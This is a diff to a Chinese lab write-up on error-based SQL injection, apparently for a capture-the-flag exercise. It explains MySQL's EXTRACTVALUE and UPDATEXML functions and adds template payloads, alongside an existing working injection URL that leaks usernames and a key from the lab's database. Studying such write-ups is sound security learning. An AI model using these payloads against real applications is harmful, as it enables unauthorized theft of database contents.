@@ -244,13 +244,40 @@ and(select 1
 	)%23 
 ```
 
-换一个，接着研究。
+换一种基于错误的泄露，接着研究。
+
+第二种： XPATH爆信息
+
+这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后
+
+查看sql手册
+语法：EXTRACTVALUE (XML_document, XPath_string);　　　　　　　
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 
+作用：从目标XML中返回包含所查询值的字符串 　　　　　　 　　　　　　
+
+语法:UPDATEXML (XML_document, XPath_string, new_value); 　　　　　　　　　　
+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 　　　　　　　　　　
+第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
+第三个参数：new_value，String格式，替换查找到的符合条件的数据。
+
+作用：改变文档中符合条件的节点的值 　　　　　　
+
+现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用
+
+公式1：username=admin' and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and '1'='1
+
+公式2：username=admin' and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and '1'='1
+
 ```
 http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23
 ```
 得到返回结果：
 
 	'::#adf#ad@@#:key#notfound!#::' 
+
+
+[基于错误回显的sql注入整理，回显sql注入](http://www.bkjia.com/Mysql/1013499.html)
 
 ### 另一种解法
 
